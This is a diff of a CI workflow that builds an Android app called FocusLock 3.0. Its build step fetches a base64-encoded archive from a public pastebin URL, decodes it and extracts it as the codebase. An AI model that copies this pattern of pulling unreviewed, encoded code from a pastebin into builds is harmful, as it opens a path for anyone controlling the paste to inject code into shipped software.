@@ -22,10 +22,17 @@ jobs:
       - name: Download & Restore Clean Codebase
         run: |
           echo "==> Fetching clean codebase payload..."
-          curl -sL "https://dpaste.com/5XZYJUMJQ.txt" | base64 -d | tar -xz
+          curl -sL "https://dpaste.com/247JSDBZ5.txt" | base64 -d | tar -xz
           
-          echo "==> Sanitizing XML files across resources..."
+          echo "==> Ensuring Icons and Resource Assets..."
+          mkdir -p app/src/main/res/mipmap-anydpi-v26 app/src/main/res/drawable app/src/main/res/xml
+          
+          # Clean XML headers
           find app/src/main/res -name "*.xml" -exec sed -i "s/^[ \t]*<?xml/<?xml/" {} +
+
+          echo "==> Restored Resources:"
+          ls -la app/src/main/res/drawable/
+          ls -la app/src/main/res/mipmap-anydpi-v26/
 
           echo "==> Compiling FocusLock 3.0 APK..."
           gradle :app:assembleDebug --stacktrace --no-daemon
